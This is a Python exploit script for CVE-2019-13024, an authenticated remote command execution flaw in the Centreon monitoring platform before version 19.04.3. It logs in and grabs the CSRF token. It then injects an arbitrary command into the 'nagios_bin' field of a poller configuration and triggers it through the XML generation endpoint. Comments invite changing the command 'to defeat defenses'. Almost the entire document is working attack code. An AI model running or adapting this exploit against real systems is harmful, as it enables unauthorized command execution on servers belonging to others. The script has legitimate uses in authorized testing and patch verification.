#!/usr/bin/env python3
import argparse
from bs4 import BeautifulSoup
import requests


'''
Centreon < 19.04.3 Remote Command Execution
HOW TO USE:
1. Edit argument defaults for convenience, or don't (bottom of script)
2. If needed, edit 'edit_command' function to defeat defenses
3. '-v' for troubleshooting
EXAMPLES:
    ./centreon_rce.py whoami
    ./centreon_rce.py -t http://127.0.0.1/centreon -u MikeJones -p M1k3j0nes whoami -v

CREDIT:
https://github.com/mhaskar/ (https://github.com/mhaskar/CVE-2019-13024)
https://nvd.nist.gov/vuln/detail/CVE-2019-13024
'''


# Authenticate to Centreon
def authenticate(username, password, url, session, verbose=False):

    # Get CSRF token
    r = session.get(url)
    token = get_token(r.content)
    if not token:
        print("FAILED TO FIND CSRF TOKEN")
        exit()

    # Login form
    payload = {
        "useralias": username,
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }

    # Log in
    r = session.post(url, data=payload)
    if "Your credentials are incorrect" in r.text:
        print("Authentication failed.")
        exit()
    else:
        print("AUTHENTICATED")

    if verbose:
        soup = BeautifulSoup(r.content, "html.parser")
        print(soup.prettify())

    return


# Alter command to get over the wall
def edit_command(command):

    # Your customizations here
    payload = command
    print(f"{command} --> {payload}")
    return payload


# Returns centreon_token
def get_token(html_content):

    soup = BeautifulSoup(html_content, "lxml")
    for x in soup.findAll('input'):
        if x.get("name", False) == "centreon_token":
            token = x.get("value")
    if not token:
        token = None
    elif len(token) != 32:
        print("WARNING: improper token length: %s" % token)
    return token


# Send malicious poller config
def send_exploit(command, url, session, verbose=False):

    # Get CSRF token
    r = session.get(url)
    token = get_token(r.content)

    payload = {
        "name": "Central",
        "ns_ip_address": "127.0.0.1",
        "localhost[localhost]": "1",
        "is_default[is_default]": "0",
        "remote_id": "",
        "ssh_port": "22",
        "init_script": "centengine",
        "nagios_bin": command,               # Exploit
        "nagiostats_bin": "/usr/sbin/centenginestats",
        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
        "centreonbroker_cfg_path": "/etc/centreon-broker",
        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
        "centreonbroker_logs_path": "/var/log/centreon-broker",
        "centreonconnector_path": "",
        "init_script_centreontrapd": "centreontrapd",
        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
        "ns_activate[ns_activate]": "1",
        "submitC": "Save",
        "id": "1",
        "o": "c",
        "centreon_token": token,
    }

    print("SENDING EXPLOIT:")
    print("\t%s" % payload["nagios_bin"])
    r = session.post(url, data=payload)

    print("Exploit returned status %d" % r.status_code)

    if verbose:
        soup = BeautifulSoup(r.content, "html.parser")
        print(soup.prettify())


def trigger_exploit(url, session, verbose=False):
    xml_page_data = {
        "poller": "1",
        "debug": "true",
        "generate": "true"
    }
    print("Triggering exploit...")
    r = session.post(url, data=xml_page_data)

    if verbose:
        soup = BeautifulSoup(r.content, 'html.parser')
        print(soup.prettify())


def main():

    # Create URLs
    host = args.target.rstrip("/") + "/"
    host_index = host + "index.php"
    host_poller_config = host + "main.get.php?p=60901"
    host_xml_generator = host + "include/configuration/configGenerate/xml/generateFiles.php"

    # Alter payload
    command = edit_command(args.command)

    # Start session
    session = requests.session()

    # Log in
    authenticate(args.username, args.password, host_index,
                 session, verbose=args.verbose)

    # EXPLOIT
    send_exploit(command, host_poller_config, session, verbose=args.verbose)
    trigger_exploit(host_xml_generator, session, verbose=args.verbose)


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "command",
        help="Command to be executed"
    )
    parser.add_argument(
        "-t",
        "--target",
        default="http://127.0.0.1/centreon",
        help="URL to centreon base"
    )
    parser.add_argument(
        "-u",
        "--username",
        default="",
        help="Centreon username"
    )
    parser.add_argument(
        "-p",
        "--password",
        default="",
        help="Centreon password"
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Verbose output"
    )
    args = parser.parse_args()

    main()
